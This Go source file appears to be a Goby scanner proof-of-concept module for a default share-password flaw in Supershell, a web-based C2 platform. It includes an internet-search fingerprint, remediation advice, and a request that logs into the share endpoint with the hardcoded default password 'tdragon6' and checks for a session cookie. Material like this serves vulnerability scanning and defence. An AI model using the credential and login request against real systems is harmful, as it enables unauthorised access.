package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SuperShell share_pwd permission bypass vulnerability",
    "Description": "<p>Supershell is a C2 remote control platform accessed through WEB services.</p><p>There is a default  share account vulnerability in SuperShell, and you can log in to obtain system privileges.</p>",
    "Product": "SuperShell",
    "Homepage": "https://github.com/tdragon6/Supershell",
    "DisclosureDate": "2023-08-09",
    "PostTime": "2023-08-09",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "title=\"Supershell\" || header=\"supershell\" || banner=\"supershell\"",
    "GobyQuery": "title=\"Supershell\" || header=\"supershell\" || banner=\"supershell\"",
    "Level": "3",
    "Impact": "<p>Attackers can use the default share account to log in to the background, seize administrator privileges, and control the entire website.</p>",
    "Recommendation": "<p>1. Modify the default share account. The salt should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://github.com/tdragon6/Supershell"
    ],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "SuperShell share_pwd 权限绕过漏洞",
            "Product": "SuperShell",
            "Description": "<p>Supershell 是一个通过 WEB 服务访问的 C2 远程控制平台。</p><p>SuperShell 存在默认共享账户，并未检测用户名权限，可登录获取系统权限。</p>",
            "Recommendation": "<p>1、修改默认共享账户，salt 最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可利用默认共享账户登录后台，夺取管理员权限，控制整个网站。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "SuperShell share_pwd permission bypass vulnerability",
            "Product": "SuperShell",
            "Description": "<p>Supershell is a C2 remote control platform accessed through WEB services.<br></p><p>There is a default&nbsp; share account vulnerability in SuperShell, and you can log in to obtain system privileges.<br></p>",
            "Recommendation": "<p>1. Modify the default share account. The salt should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can use the default share account to log in to the background, seize administrator privileges, and control the entire website.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10815"
}`

	sendPayload480da11f := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/supershell/share/shell/login/auth")
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Data = "{\"share_password\":\"tdragon6\"}"
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayload480da11f(u)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, "success") && rsp.Cookie != ""
		},
		nil,
	))
}
